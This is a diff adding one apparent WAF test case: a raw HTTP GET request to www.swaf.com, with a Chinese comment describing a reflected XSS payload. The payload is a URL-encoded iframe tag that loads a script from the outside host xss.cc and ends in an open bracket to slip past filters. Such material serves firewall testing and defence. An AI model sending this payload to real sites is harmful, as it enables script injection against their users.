@@ -1,0 +1,9 @@
+# XSS跨站脚本_GET_标签属性_数据混淆类(开括号绕过)-06506833
+# 攻击载荷利用<iframe>标签和src属性来引入一个恶意脚本。双开括号，在向量的末尾使用开括号而不是闭括号会导致Netscape Gecko渲染中的不同行为。
+GET /?id=%3Ciframe%20src=http:%2F%2Fxss.cc%2Fscriptlet.html%20%3C&bid=hd_tag_m8mv24zd HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv24zd
+RM-PRO-Token: 216988de78855ce9345836d9547c2d5a
+RM-PRO-Time: 1742808425467
+User-Agent: curl/7.83.1
+
